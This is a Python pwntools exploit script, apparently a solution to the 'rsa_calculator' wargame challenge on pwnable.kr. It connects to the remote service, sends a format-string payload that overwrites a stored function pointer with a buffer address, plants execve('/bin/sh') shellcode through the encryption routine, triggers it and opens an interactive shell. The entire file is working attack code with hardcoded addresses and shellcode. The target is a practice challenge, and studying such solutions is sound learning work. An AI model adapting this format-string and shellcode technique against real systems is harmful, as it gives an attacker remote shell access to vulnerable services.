from pwn import *

class RsaCalculatorExploit(object):

    EXECVE_BIN_SH_SHELLCODE = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    MYEXIT_ADDRESS = 0x602520
    G_PLAIN_DATA_BUFFER_ADDRESS = 0x602560

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9012)

    def set_key(self, p, q, public_key_exp_e, private_key_exp_d):
        print(self.shell.recvuntil(">"))
        self.shell.sendline(f"1\n{p}\n{q}\n{public_key_exp_e}\n{private_key_exp_d}")

    def set_key_to_valid_rsa_params(self):
        self.set_key(p=17, q=19, public_key_exp_e=5, private_key_exp_d=461)

    def encrypt(self, plain_data):
        print(self.shell.recvuntil(">"))
        self.shell.sendline(b"2\n1024\n" + plain_data)
        print(self.shell.recvuntil("-encrypted result (hex encoded) -\n"))
        encrypted_data = self.shell.recvline().strip()
        return encrypted_data

    def decrypt(self, encrypted_data):
        print(self.shell.recvuntil(">"))
        self.shell.sendline(b"3\n1024\n" + encrypted_data)
        print(self.shell.recvuntil("- decrypted result -\n"))
        decrypted_data = self.shell.recvline().strip()
        return decrypted_data

    def exploit_fsb_to_overwrite_myexit(self):
        raw_exploit_payload = f"%{self.G_PLAIN_DATA_BUFFER_ADDRESS}c%26$n".encode()
        encrypted_part_exploit_payload = self.encrypt(raw_exploit_payload)
        complete_exploit_payload = encrypted_part_exploit_payload + p64(self.MYEXIT_ADDRESS)
        self.decrypt(complete_exploit_payload)

    def place_shellcode_in_memory(self):
        self.encrypt(self.EXECVE_BIN_SH_SHELLCODE)

    def trigger_shellcode(self):
        print(self.shell.recvuntil(">"))
        self.shell.sendline("5")

    def run(self):
        self.set_key_to_valid_rsa_params()
        self.exploit_fsb_to_overwrite_myexit()
        self.place_shellcode_in_memory()
        self.trigger_shellcode()
        self.shell.interactive()


if __name__ == '__main__':
    RsaCalculatorExploit().run()
